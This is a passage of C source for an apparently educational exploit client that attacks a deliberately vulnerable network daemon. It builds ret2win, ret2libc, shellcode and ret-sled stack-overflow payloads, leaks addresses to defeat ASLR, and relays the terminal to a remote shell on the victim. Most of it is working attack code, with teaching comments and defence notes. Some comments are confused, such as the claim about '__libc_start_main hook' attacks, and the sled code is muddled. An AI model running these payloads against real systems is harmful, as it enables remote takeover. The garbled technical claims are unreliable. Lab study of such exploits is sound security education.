 * The hard-won lesson of this function: there is NO shell on this side. There
 * is exactly one shell in the whole picture, and it is running on the victim,
 * inside `food`'s hijacked process, with the TCP connection as its stdin,
 * stdout and stderr. We already have it. It is already interactive. The RCE is
 * finished the moment its prompt appears.
 *
 * So all this side has to do is move bytes:
 *
 *      terminal  <------>  TCP socket  <------>  victim's /bin/sh
 *
 * Anything more is a bug. Both earlier versions of this code were:
 *
 *   VERSION 1:  dup2 the socket onto our own 0/1/2, then execv a local sh.
 *     The terminal became unreachable -- you typed into a descriptor nobody
 *     was reading -- so the session was deaf and mute. A shell you cannot
 *     type at, connected to nothing.
 *
 *   VERSION 2:  the three dup2s, plus a forked child relaying the terminal.
 *     This one was subtler and far more convincing, because it mostly worked:
 *     you got a prompt, commands ran, output appeared. But the local shell and
 *     the relay child were BOTH reading from the same socket, and the kernel
 *     does not care that they are cooperating -- it just hands each arriving
 *     chunk to whichever reader's read() lands first. The local shell, being
 *     an interactive login shell, read exactly ONE byte and discarded it.
 *     Every single time.
 *
 *     The symptom was pure sorcery: the victim's output arrived with its first
 *     character missing. "uid=1000(hanez)" printed as "id=1000(hanez)";
 *     "PWNED-OK" printed as "WNED-OK"; "Linux 7.2.7" printed as "inux 7.2.7".
 *     The pty was not dropping bytes, the shell was not misbehaving, and the
 *     exploit was working perfectly -- one byte per chunk was being eaten by a
 *     process that had no business reading that descriptor. `strace -f` showed
 * *     it immediately: the shell's read(0, "u", 1) interleaved with the
 *     relay's read(sock, "id=1000...", 310).
 *
 *     One lesson worth more than the exploit: on a stream socket, "two
 *     processes sharing a descriptor" means "bytes split unpredictably between
 *     them", not "one reads, one writes". A descriptor has exactly one read
 *     cursor, and every reader on it moves that cursor. If you need two
 *     consumers of a byte stream, that stream has to be demultiplexed by a
 *     single reader that then distributes the bytes deliberately.
 */
static void become_shell(int fd)
{
    pid_t relay;

    printf("fooc: the shell is on the victim; relaying this terminal to it\n");

    /*
     * Fork the relay. The child owns the byte-moving; this process just waits
     * for it so we do not exit and orphan the session. Nothing here should
     * touch `fd` -- a single reader of the socket is the entire point.
     */
    relay = fork();
    if (relay < 0) {
        fprintf(stderr, "\nfooc: fork() failed: %s\n", strerror(errno));
        fprintf(stderr, "fooc: cannot relay the session; the payload has\n"
                        "       still landed, so the shell exists on the\n"
                        "       victim -- this terminal just cannot reach it.\n");
        return;
    }

    if (relay == 0) {
        relay_stdio(fd);
        _exit(0);
    }

    /*
     * Parent: wait for the session to end, then collect the child. Nothing
     * reads the socket here, on purpose. If the user hits Ctrl-D, or types
     * `exit`, the victim shell closes the connection, the relay's read()
     * returns 0, the relay exits, and waitpid() reaps it.
     *
     * waitpid() is interrupted by signals (SIGCHLD from anything else, or a
     * terminal-generated SIGWINCH as you resize the window), so the loop
     * retries rather than returning early and orphaning the child.
     */
    for (;;) {
        int   status;
        pid_t r = waitpid(relay, &status, 0);
        if (r == relay)
            break;
        if (r < 0 && errno == EINTR)
            continue;
        if (r < 0) {
            fprintf(stderr, "\nfooc: waitpid: %s\n", strerror(errno));
            break;
        }
    }

    close(fd);
    printf("\nfooc: session closed.\n");
}

/* ------------------------------------------------------------------------- */
/* The techniques                                                            */
/* ------------------------------------------------------------------------- */

/*
 * TECHNIQUE 1 -- ret2win
 * ---------------------------------------------------------------------------
 * The simplest possible proof of arbitrary code execution.
 *
 *   [ 88 bytes of junk ][ address of food's win() ]
 *                      ^ saved rbp
 *                                          ^ becomes RIP
 *
 * win() exists in the target binary, so we do not need to know anything about
 * ASLR -- only the binary's own link address, which is fixed because food is
 * built -no-pie. This is the "control the instruction pointer" milestone.
 *
 * DEFENCE NOTE: in real software the equivalent mistake is shipping a
 * "diagnostic" or "maintenance backdoor" entry point in a networked binary.
 * If win() is in the binary, a buffer overflow will find it. (It is also why
 * this technique is now much rarer: -fno-pie, or more often just an
 * attacker-supplied `__libc_start_main` hook, is what modern attacks use.)
 */
static void build_ret2win(struct pbuf *p, const struct bininfo *bi)
{
    pbuf_pad(p, bi->rip_off);        /* Fill buf + saved rbp.                  */
    pbuf_u64(p, bi->win_addr);       /* Overwrite the return address.          */
}

/*
 * TECHNIQUE 2 -- ret2libc
 * ---------------------------------------------------------------------------
 * Suppose the binary contains nothing useful. No problem: libc is full of
 * useful functions, and we can call any of them.
 *
 *   [ junk ][ pop rdi; ret ][ address of "/bin/sh" ][ address of system ]
 *             ^^^^^^^^^^^^     ^^^^^^^^^^^^^^^^^^^    ^^^^^^^^^^^^^^^^^^^^^
 *             sets rdi to      the string we want     the function to call
 *             point at         passed as argv[0]
 *
 * Step by step, at execution time:
 *   1. `ret` in food pops pop_rdi into RIP; RSP now points at the "/bin/sh"
 *      address.
 *   2. `pop rdi` loads that address into RDI (the first argument register)
 *      and advances RSP to the system() address.
 *   3. `ret` pops system() into RIP. RDI still holds the string.
 *   4. system() executes "/bin/sh". Because food dup2'd the socket onto
 *      fds 0/1/2 earlier, the shell is interactive over the network.
 *
 * The important idea: we never needed to know the address of system() in
 * advance. We used a *gadget already in libc* to construct a call we could
 * not have written ourselves.
 *
 * DEFENCE NOTE: ret2libc is defeated by ASLR, because we would have to guess
 * libc's base. Our leak is what defeats ASLR here. Modern Linux also enables
 * CET (shadow stack) on supported CPUs, which keeps a hardware copy of the
 * return address on a separate stack; a mismatched `ret` faults immediately.
 */
static void build_ret2libc(struct pbuf *p, const struct bininfo *bi,
                           const struct libcinfo *li, const struct leaks *lk)
{
    /*
     * Derive the target's libc base from the leaked `read` pointer, then add
     * our own measured offsets. All the arithmetic ASLR would otherwise
     * randomise happens right here, on our side, where we have the leaks.
     */
    unsigned long base = lk->libc_read - li->off_read;
    unsigned long system = base + li->off_system;
    unsigned long binsh  = base + li->off_binsh;
    unsigned long poprdi = base + li->off_poprdi;

    printf("fooc: libc base  = %#lx   (from leaked read %#lx - %#lx)\n",
           base, lk->libc_read, li->off_read);
    printf("fooc: system     = %#lx\n", system);
    printf("fooc: \"/bin/sh\"  = %#lx\n", binsh);
    printf("fooc: pop rdi;ret= %#lx\n", poprdi);

    pbuf_pad(p, bi->rip_off);
    pbuf_u64(p, poprdi);       /* Gadget: load the next 8 bytes into RDI.       */
    pbuf_u64(p, binsh);        /* Argument to system().                        */
    pbuf_u64(p, system);       /* The function itself.                         */
}

/*
 * TECHNIQUE 3 -- shellcode  (the one the brief asks for)
 * ---------------------------------------------------------------------------
 * Put machine code in the buffer and jump into it.
 *
 *   [ 23-byte shellcode ][ padding ][ address of buf ]
 *     ^ executes here       ^ fills   ^ so RIP lands on our code
 *                         the gap
 *
 * This is the purest form of the bug: the attacker supplies the instructions
 * the CPU will execute, not just the address of instructions that already
 * exist. No leaked function addresses are needed, so it works against a
 * statically linked, fully randomised target.
 *
 * We need `address of buf`, which we get from the BUF= leak. Without a leak we
 * would have to guess a randomised stack address -- see --sled below.
 *
 * DEFENCE NOTE -- and this is the big one:
 *
 *   *** NX bit (a.k.a. W^X, "no execute") ***
 *
 *   Marking the stack non-executable turns this payload into a crash: the
 *   hardware refuses to fetch instructions from pages flagged data-only, so
 *   the `ret` lands on a page that cannot be executed. It is a single CPU
 *   feature, costs essentially no performance, and on x86-64 it has been
 *   mandatory since every mainstream OS. It is enabled by default everywhere.
 *
 *   So in practice: on a modern hardened system this exact payload fails, and
 *   an attacker must return to technique 1 or 2 (run existing code via ROP)
 *   because they may not introduce new code. That is the whole point of ROP:
 *   it is what attackers pivot to *because* NX works.
 *
 *   Compile food without -z execstack to watch this fail. See README.md.
 */
static void build_shellcode(struct pbuf *p, const struct bininfo *bi,
                            const struct leaks *lk)
{
    printf("fooc: buf is at %#lx, placing %d bytes of shellcode there\n",
           lk->buf, SHELLCODE_LEN);

    /*
     * The shellcode goes at the very start of buf, so execution begins at its
     * first byte. Note that the region must be executable -- true here only
     * because we compiled the target without -z execstack.
     */
    for (int i = 0; i < SHELLCODE_LEN; i++)
        pbuf_u8(p, SHELLCODE[i]);

    /* Fill the rest of the run up to the saved return address. */
    size_t used = SHELLCODE_LEN;
    if (bi->rip_off > used)
        pbuf_pad(p, bi->rip_off - used);

    /* Point RIP at buf. This is the one value that must be exactly right. */
    pbuf_u64(p, lk->buf);
}

/*
 * THE RET SLED -- a deliberate dead end, kept for teaching.
 *
 * If you had no leak, you could fill the entire overwritable region with the
 * address of a `ret` instruction. Wherever the saved return address happens to
 * land, the CPU would then "slide" forward, executing `ret` after `ret`, until
 * it walked off the end of the sled into your shellcode. It is a brute-force
 * attack on ASLR: you send the payload repeatedly until the layout lines up.
 *
 * Why it does not work here, honestly: food only accepts 512 bytes, and after
 * 88 bytes of buffer the sled is at most 424 bytes -- about 53 eight-byte
 * slots. ASLR randomises the stack by far more than 2^6 possibilities, so the
 * odds of a hit are effectively zero. This is the whole reason the leak in
 * food exists, and the reason real-world exploits put so much work into ASLR
 * bypasses: a leak turns an unworkable guessing game into arithmetic.
 *
 * The mode is implemented so you can see the failure, and so you can confirm
 * the mechanism is genuinely "the CPU follows a chain of rets".
 */
static void build_sled(struct pbuf *p, const struct bininfo *bi,
                       const struct leaks *lk)
{
    if (bi->ret_gadget == 0) {
        fprintf(stderr, "fooc: no `ret` gadget found in the target binary\n");
        return;
    }
    printf("fooc: building a %lu-byte ret sled from %#lx\n",
           bi->rip_off, bi->ret_gadget);

    /*
     * Layout: junk, then the sled, then the shellcode, then one final jump
     * into the shellcode. The saved return address is one of the sled
     * entries, wherever ASLR's `ret` happens to land.
     */
    pbuf_pad(p, bi->rip_off);
    for (int i = 0; i < 8; i++)
        pbuf_u8(p, SHELLCODE[i]);          /* Placeholder; rewritten below.   */
    p->len = bi->rip_off;                  /* Rewind over the placeholder.    */

    /*
     * Everything from the saved return address up to 8 bytes from the end is
     * filled with the `ret` gadget. The last 8 bytes are the shellcode's
     * address, so the final `ret` of the sled lands on the code.
     */
    size_t sled_bytes = 384;               /* How much sled we can afford.     */
    if (sled_bytes < bi->rip_off + 16)
        sled_bytes = bi->rip_off + 16;
    pbuf_pad(p, sled_bytes);
    for (int i = 0; i < SHELLCODE_LEN; i++)
        pbuf_u8(p, SHELLCODE[i]);
    pbuf_u64(p, lk->buf);                  /* Where the sled ends up.         */
    pbuf_u64(p, bi->ret_gadget);           /* One more hop, deterministically.*/
}

/*
 * OVERFLOW DEMO -- prove the bug without needing a working target address.
 *
 * Send exactly rip_off + 8 bytes of 0x41. That fills the buffer, fills the
 * saved frame pointer, and replaces the return address with
 * 0x4141414141414141 -- an address that is certainly not mapped. The CPU
 * jumps there, takes a page fault, and the kernel kills the process with
 * SIGSEGV.
 *
 * If this reliably kills `food` while a 64-byte payload does not, you have
 * demonstrated the vulnerability and the offset calculation in one shot.
 */
static void build_demo(struct pbuf *p, const struct bininfo *bi)
{
    pbuf_pad(p, bi->rip_off + 8);
}

/* ------------------------------------------------------------------------- */
/* main()                                                                     */
/* ------------------------------------------------------------------------- */

static void usage(const char *a0)
{
    printf(
"fooc -- exploit for the intentionally vulnerable daemon 'food'\n"
"\n"
"usage: %s [options]\n"
"\n"
"  -h HOST    target address        (default %s)\n"
"  -p PORT    target port           (default %d)\n"
"  -b PATH    target binary to analyse (default %s)\n"
"  -t TECH    technique:\n"
"                ret2win     jump to win() in the target          [default]\n"
"                ret2libc    call system(\"/bin/sh\") in libc\n"
"                shellcode   run our own execve() shellcode\n"
"                sled        ret sled + shellcode (no leak; ~always fails)\n"
"                demo        overflow with junk only, expect SIGSEGV\n"
"                leak        just print the leaks, send no payload\n"
"  -i         drop into an interactive shell after the payload lands\n"
"             (default for ret2win/ret2libc/shellcode)\n"
"  -n         do NOT become a shell; just send the payload and report\n"
"  -v         verbose: dump the payload and every address\n"
"\n"
"examples:\n"
"  %s -t leak                     # see what food tells us\n"
"  %s -t demo -v                  # prove the overflow exists\n"
"  %s -t ret2win -i               # easiest working shell\n"
"  %s -t ret2libc -i              # call libc's system()\n"
"  %s -t shellcode -i             # run raw machine code\n"
"\n"
"Only point -h at a machine you own or are authorised to test.\n",
    a0, FOOC_HOST, FOOC_PORT, FOOC_BIN, a0, a0, a0, a0, a0);
}

int main(int argc, char **argv)
{
    const char *host = FOOC_HOST;     /* -h                                       */
    const char *binpath = FOOC_BIN;   /* -b                                       */
    const char *tech = "ret2win";     /* -t                                       */
    int   port = FOOC_PORT;           /* -p                                       */
    int   verbose = 0;                /* -v                                       */
    int   want_shell = -1;            /* -i / -n                                  */
    int   fd;                         /* The socket to the victim.               */
    int   o;                          /* getopt() index.                          */
    struct bininfo bi;                /* What we learned from the binary.        */
    struct libcinfo li;               /* What we learned from libc.              */
    struct leaks lk;                  /* What the victim told us.                */
    struct pbuf p = { NULL, 0, 0 };   /* The payload under construction.         */
    char rx[RECV_MAX];                /* Banner + leak text.                     */
    int  is_leak = 0;                     /* -t leak: diagnostics only.       */

    while ((o = getopt(argc, argv, ":h:p:b:t:inv")) != -1) {
        switch (o) {
        case 'h': host = optarg; break;
        case 'p': port = atoi(optarg); break;
        case 'b': binpath = optarg; break;
        case 't': tech = optarg; break;
        case 'i': want_shell = 1; break;
        case 'n': want_shell = 0; break;
        case 'v': verbose = 1; break;
        default:  usage(argv[0]); return 2;
        }
    }

    /* ---- Phase 1: learn everything we can without touching the network. -- */
    if (analyse_binary(binpath, &bi) < 0)
        return 1;

    if (analyse_libc(&li) < 0)
        return 1;

    printf("fooc: target binary   : %s\n", binpath);
    printf("fooc: vulnerable_handler = %#lx\n", bi.vuln_addr);
    printf("fooc: win()            = %#lx\n", bi.win_addr);
    /* rbp_off_as_signed is negative on purpose: the buffer sits *below* rbp.
     * Negating an unsigned long would wrap around and print as 18446744073...,
     * so convert to a signed type first, then let printf show the minus. */
    long rbp_off_as_signed = -(long)bi.frame_off;
    printf("fooc: buf is at rbp%+ld, so the saved RIP is %lu bytes in\n",
           rbp_off_as_signed, bi.rip_off);
    printf("fooc: ret gadget       = %#lx\n", bi.ret_gadget);
    printf("fooc: our libc base    = %#lx  (system @ %#lx, \"/bin/sh\" @ %#lx)\n",
           li.base, li.off_system, li.off_binsh);

    /* ---- Decide whether we want an interactive shell by default. -------- */
    if (strcmp(tech, "demo") == 0 || strcmp(tech, "leak") == 0) {
        is_leak = (strcmp(tech, "leak") == 0);
        if (want_shell == -1) want_shell = 0;
    } else if (want_shell == -1) {
        want_shell = 1;    /* The point of an exploit is a shell.            */
    }

    /* ---- Phase 2: connect and read what the daemon tells us. ------------- */
    fd = connect_to(host, port);
    if (fd < 0)
        return 1;

    /*
     * Wait for every leak, including in `leak` mode. It is tempting to settle
     * for just "stack=" and "libc=" there, but BUF= is emitted last, so
     * stopping as soon as the first two appear would routinely return before
     * it has arrived -- and a partially-read banner is a classic source of
     * "works on my machine" exploit flakiness.
     */
    {
        const char *pats[3] = { "stack=", "libc=", "BUF=" };
        if (read_until(fd, pats, 3, rx, sizeof(rx)) < 0)
            fprintf(stderr, "fooc: warning: incomplete banner/leak text\n");
    }

    printf("fooc: daemon said:\n----\n%s----\n", rx);

    if (parse_leaks(rx, &lk) < 0) {
        close(fd);
        return 1;
    }

    printf("fooc: leaked stack ptr  = %#lx\n", lk.stack);
    printf("fooc: leaked libc read  = %#lx\n", lk.libc_read);
    printf("fooc: leaked buf        = %#lx\n", lk.buf);

    if (is_leak) {
        /* Diagnostic mode: we learned what we came to learn, stop here. */
        printf("fooc: leak mode -- not sending a payload.\n");
        close(fd);
        return 0;
    }

    /* ---- Phase 3: build the payload. ----------------------------------- */
    if      (strcmp(tech, "ret2win") == 0)  build_ret2win(&p, &bi);
    else if (strcmp(tech, "ret2libc") == 0)  build_ret2libc(&p, &bi, &li, &lk);
    else if (strcmp(tech, "shellcode") == 0) build_shellcode(&p, &bi, &lk);
    else if (strcmp(tech, "sled") == 0)      build_sled(&p, &bi, &lk);
    else if (strcmp(tech, "demo") == 0)      build_demo(&p, &bi);
    else {
        fprintf(stderr, "fooc: unknown technique '%s'\n", tech);
        close(fd);
        return 2;
    }

    if (p.len == 0) {
        fprintf(stderr, "fooc: payload is empty -- aborting\n");
        close(fd);
        return 1;
    }

    if (verbose) {
        printf("fooc: payload is %zu bytes; the last 16 are:\n  ", p.len);
        size_t start = p.len > 16 ? p.len - 16 : 0;
        for (size_t i = start; i < p.len; i++)
            printf("%02x ", p.data[i]);
        printf("\n");
    }

    /*
     * ------------------------------------------------------------------
     * STACK ALIGNMENT -- the subtlest bug in this whole lab
     * ------------------------------------------------------------------
     *
     * SYMPTOM: the hijack lands correctly (gdb shows you sitting in win()), and
     * then the very first thing win() does -- a dprintf() -- dies. The SIGSEGV
     * reports RIP deep inside libc's formatter and a faulting address of
     * (nil), which is deeply misleading: it looks like a corrupted pointer.
     *
     * CAUSE: the System V AMD64 ABI requires 16-byte stack alignment. A
     * normal `ret` restores %rsp to precisely the value saved by its matching
     * `call`, so the invariant is preserved for free. Our bare `ret` does not:
     * after it, %rsp = buf + rip_off. Here buf is 16-byte aligned (the ABI
     * guarantees local arrays are) and rip_off is 88, so we hand the callee a
     * stack that is 8 mod 16 -- misaligned.
     *
     * glibc is compiled with SSE2, and instructions like movaps/movdqa *fault*
     * on a misaligned operand. On x86 an alignment violation raises #GP, not
     * #PF, so the kernel has no faulting address to report and fills in
     * si_addr = 0. That NULL address is the tell: an alignment fault dressed up
     * as a NULL dereference.
     *
     * FIX: one `ret` gadget. A ret adds exactly 8 to %rsp, which is exactly
     * what is needed here:
     *
     *      [ padding ][ ret ][ real target ]
     *                             ^
     *      on entry to the real target, %rsp = buf + rip_off + 8 = 16-aligned
     *
     * A stray `ret` that looks like a mistake is nearly always deliberate.
     *
     * (With CET enabled the shadow stack would fault on that second ret
     * instead, which is one of the specific things CET is built to stop.)
     * ------------------------------------------------------------------
     */
    if (strcmp(tech, "demo") == 0 || strcmp(tech, "sled") == 0) {
        /*
         * Neither lands in a real callee that expects an aligned stack:
         * `demo` jumps to a deliberately invalid address, and `sled` only
         * ever executes bare `ret` instructions. So skip the alignment fix.
         */
    } else if (bi.ret_gadget != 0 && (bi.rip_off % 16) == 8) {
        /*
         * We need %rsp to be 16-byte aligned on entry to the real target.
         * %rsp = buf + rip_off on entry, buf is 16-aligned, and rip_off is 88,
         * so we are 8 mod 16 and need exactly one extra `ret` (each ret adds
         * 8). If rip_off were 0 mod 16 we would instead be already aligned and
         * this extra ret would BREAK the payload -- the condition matters in
         * both directions.
         *
         * ORDERING IS CRITICAL. The builders above have already written
         *  [ padding | target | ... ]  with the target sitting at rip_off.
         * Appending here would produce  [ padding | target | ret ], where the
         * very first `ret` returns to `target` and the trailing `ret` is never
         * reached -- the fix silently does nothing. (That was the first
         * version of this code, and the crash it failed to fix looked
         * identical to having no fix at all.)
         *
         * The `ret` therefore has to be *inserted at rip_off*, shifting the
         * real target up by 8 bytes.
         */
        unsigned char *fixed;
        size_t head = bi.rip_off;    /* Bytes before the target address.      */

        if (head > p.len) {
            fprintf(stderr, "fooc: payload is shorter than rip_off\n");
            free(p.data);
            close(fd);
            return 1;
        }

        /* Build the corrected buffer: everything up to rip_off, then the
         * `ret` gadget, then the original target and any trailing payload. */
        fixed = malloc(p.len + 8);
        if (fixed == NULL) {
            fprintf(stderr, "fooc: out of memory building alignment fix\n");
            free(p.data);
            close(fd);
            return 1;
        }
        memcpy(fixed, p.data, head);                    /* the padding       */
        memcpy(fixed + head, &bi.ret_gadget, 8);         /* the extra `ret`   */
        memcpy(fixed + head + 8, p.data + head, p.len - head); /* the real tgt */

        free(p.data);
        p.data = fixed;
        p.cap  = p.len + 8;
        p.len += 8;

        printf("fooc: inserted a `ret` (at %#lx) at offset %lu to restore "
               "16-byte alignment\n", bi.ret_gadget, head);
    }

    /* ---- Phase 4: send it and hand over. -------------------------------- */
    printf("fooc: sending %zu bytes (offset to RIP is %lu)\n", p.len, bi.rip_off);
    if (send_all(fd, p.data, p.len) < 0) {
        fprintf(stderr, "fooc: send failed: %s\n", strerror(errno));
        close(fd);
        return 1;
    }

    free(p.data);

    if (!want_shell) {
        /* Give the victim a moment to act on the payload, then show anything
         * it said. This is how you observe the `demo` technique's SIGSEGV. */
        usleep(400000);
        drain_hint(fd);
        printf("fooc: done (no shell requested)\n");
        close(fd);
        return 0;
    }

    /* The daemon echoes the first 64 bytes of our payload back at us before
     * it returns. Swallow that so it does not look like shell output. */
    usleep(200000);
    drain_hint(fd);

    become_shell(fd);   /* Relays this terminal to the victim until it ends. */

    return 0;
}
